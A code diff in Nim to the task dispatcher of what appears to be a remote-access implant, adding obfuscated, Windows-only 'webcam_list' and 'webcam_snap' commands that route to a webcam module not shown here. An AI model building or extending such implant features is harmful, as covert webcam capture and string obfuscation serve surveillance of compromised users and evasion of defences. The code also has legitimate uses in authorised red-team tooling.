@@ -140,6 +140,8 @@ when defined(windows):
     import ../tasks/register_file
   when defined(cmd_deregister_file):
     import ../tasks/deregister_file
+  when defined(cmd_webcam_list) or defined(cmd_webcam_snap):
+    import ../tasks/webcam
 
 type
   TaskExecutionResult* = object
@@ -876,6 +878,34 @@ proc executeTask*(taskId: string, command: string, params: JsonNode): TaskExecut
             obf("completed"): true,
             obf("status"): "error",
             obf("user_output"): obf("spawnas command is only available on Windows")
+          }
+    
+    of obf("webcam_list"):
+      when defined(cmd_webcam_list):
+        when defined(windows):
+          debug "[DEBUG] Executing webcam_list command"
+          result.response = webcamList(taskId, params)
+          result.response[obf("task_id")] = %taskId
+        else:
+          result.response = %*{
+            obf("task_id"): taskId,
+            obf("completed"): true,
+            obf("status"): "error",
+            obf("user_output"): obf("webcam_list command is only available on Windows")
+          }
+    
+    of obf("webcam_snap"):
+      when defined(cmd_webcam_snap):
+        when defined(windows):
+          debug "[DEBUG] Executing webcam_snap command"
+          result.response = webcamSnap(taskId, params)
+          result.needsBackgroundTracking = true
+        else:
+          result.response = %*{
+            obf("task_id"): taskId,
+            obf("completed"): true,
+            obf("status"): "error",
+            obf("user_output"): obf("webcam_snap command is only available on Windows")
           }
     
     else:
